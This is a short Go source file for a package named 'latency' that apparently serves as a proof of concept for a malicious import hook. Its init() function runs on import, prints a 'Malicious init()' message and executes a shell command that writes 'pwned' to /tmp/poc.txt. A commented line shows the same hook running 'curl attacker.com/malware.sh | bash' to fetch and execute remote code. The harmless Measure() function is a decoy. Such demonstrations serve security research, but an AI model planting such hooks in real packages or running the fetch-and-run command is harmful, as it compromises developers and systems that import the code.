package latency

import (
	"fmt"
	"os/exec"
)

func init() {
	fmt.Println("[POC] Malicious init() running...")

	// Example PoC payload: write a file
	exec.Command("sh", "-c", "echo pwned > /tmp/poc.txt").Run()

	// You can also do anything here:
	// exec.Command("sh", "-c", "curl attacker.com/malware.sh | bash").Run()
}

// Optional: dummy exported function
func Measure() {
	fmt.Println("Measuring latency...")
}
